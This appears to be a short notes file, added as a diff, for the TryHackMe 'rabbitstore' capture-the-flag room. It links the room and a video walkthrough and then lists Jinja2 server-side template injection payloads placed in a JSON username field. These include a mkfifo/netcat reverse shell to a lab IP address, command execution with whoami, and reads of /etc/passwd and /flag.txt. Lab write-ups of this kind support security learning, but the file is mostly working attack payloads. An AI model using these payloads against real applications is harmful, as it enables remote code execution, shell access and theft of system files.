@@ -1,0 +1,20 @@
+room link: https://tryhackme.com/room/rabbitstore
+YouTube video walk throug: https://youtu.be/BLEUNfBgNAg
+
+Here the payload used on SSTI (Server-side template injection) part in this room:
+
+revers shell:
+{"username":"{{request.application.__globals__.__builtins__.eval('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.192.103 1234 >/tmp/f\").read()')}}"}
+
+other payload
+
+{"username":"{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('whoami', shell=True)}}"}
+
+{"username":"{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}"}
+
+{"username":"{{request.application.__globals__.__builtins__.eval('__import__(\"os\").popen(\"whoami\").read()')}}"}
+
+
+{"username":"{{request.application.__globals__.__builtins__.__import__('sys').modules['os'].popen('whoami').read()}}"}
+
+{"username":"{{config.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"}
